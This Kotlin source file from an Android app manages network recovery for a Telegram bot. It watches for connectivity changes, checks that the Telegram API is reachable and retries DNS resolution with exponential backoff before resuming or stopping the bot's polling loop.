package com.system.superiormonitor.core

import android.content.Context
import android.net.ConnectivityManager
import android.net.Network
import com.system.superiormonitor.bot.TelegramApi
import com.system.superiormonitor.core.LogCategory
import com.system.superiormonitor.core.LogLevel
import com.system.superiormonitor.core.LogManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

class NetworkRecoveryManager(
    private val context: Context,
    private val serviceScope: CoroutineScope,
    private val callbacks: NetworkCallbacks
) {

    interface NetworkCallbacks {
        fun onNetworkAvailable()
        fun onNetworkLost()
        fun startPollingLoop()
        fun stopPollingLoop()
        suspend fun sendConnectionRestoredNotification()
        fun isPollingJobActive(): Boolean
        fun getBotToken(): String?
    }

    private var networkCallback: ConnectivityManager.NetworkCallback? = null
    private var recoveryJob: Job? = null

    fun registerNetworkCallback() {
        if (networkCallback != null) return

        val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        networkCallback = object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network) {
                callbacks.onNetworkAvailable()

                if (!callbacks.isPollingJobActive()) {
                    LogManager.log(LogCategory.BOT_ACTIVITY, "[NETWORK] Network connection detected. Initiating recovery sequence...")
                    recoveryJob?.cancel()
                    recoveryJob = serviceScope.launch(Dispatchers.IO) {
                        val token = callbacks.getBotToken()
                        if (token != null) {
                            LogManager.log(LogCategory.BOT_ACTIVITY, "[NETWORK] Checking Telegram API reachability...")
                            var attempts = 0
                            while (TelegramApi.getMe(token) == null) {
                                attempts++
                                if (attempts > 30) { // 60 seconds max wait
                                    LogManager.log(LogCategory.BOT_ACTIVITY, "[NETWORK] Telegram API unreachable. Returning to deep sleep.")
                                    return@launch
                                }
                                delay(2000)
                            }
                            LogManager.log(LogCategory.BOT_ACTIVITY, "[NETWORK] Telegram API is reachable!")
                        }

                        LogManager.log(LogCategory.BOT_ACTIVITY, "[NETWORK] Waiting 5 seconds for network stabilization...")
                        delay(5000)

                        if (!resolveDnsWithRetries("api.telegram.org")) {
                            LogManager.log(LogCategory.BOT_ACTIVITY, "[NETWORK] DNS resolution failed after 3 retries. Returning to deep sleep.", LogLevel.ERROR)
                            return@launch
                        }

                        LogManager.log(LogCategory.SYSTEM, "DNS resolved. Connection restored. Resuming Telegram polling loop.")
                        TelegramApi.evictConnections()

                        callbacks.sendConnectionRestoredNotification()
                        callbacks.startPollingLoop()
                    }
                }
            }

            override fun onLost(network: Network) {
                LogManager.log(LogCategory.SYSTEM, "[System] Network offline. Deep sleep mode active.")
                callbacks.onNetworkLost()
                callbacks.stopPollingLoop()
                recoveryJob?.cancel()
            }
        }
        connectivityManager.registerDefaultNetworkCallback(networkCallback!!)
    }

    fun unregisterNetworkCallback() {
        networkCallback?.let { 
            val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            connectivityManager.unregisterNetworkCallback(it)
        }
        recoveryJob?.cancel()
        networkCallback = null
    }

    private suspend fun resolveDnsWithRetries(host: String): Boolean {
        var delayMs = 5000L
        while (serviceScope.isActive && networkCallback != null) {
            try {
                withContext(Dispatchers.IO) {
                    java.net.InetAddress.getByName(host)
                }
                return true
            } catch (e: Exception) {
                LogManager.log(LogCategory.SYSTEM, "DNS resolution failed. Retrying in ${delayMs / 1000}s...", LogLevel.ERROR)
                delay(delayMs)
                if (delayMs < 60000L) delayMs *= 2 // Exponential backoff up to 60s
            }
        }
        return false
    }
}
